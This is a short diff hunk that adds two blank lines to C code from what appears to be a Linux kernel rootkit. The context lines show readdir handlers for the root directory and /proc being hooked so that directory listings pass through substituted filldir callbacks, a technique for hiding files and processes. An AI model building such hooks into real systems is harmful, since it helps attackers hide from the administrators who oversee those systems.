@@ -184,6 +184,8 @@ static int hooked_root_readdir(struct file* filp, void* dirent, filldir_t filldi
     return original_root_readdir(filp, dirent, hooked_root_filldir);
 }
 
+
+
 static inline int hooked_proc_readdir(struct file* filp, void* dirent, filldir_t filldir){
     original_filldir = filldir;
     return original_proc_readdir(filp, dirent, hooked_proc_filldir);
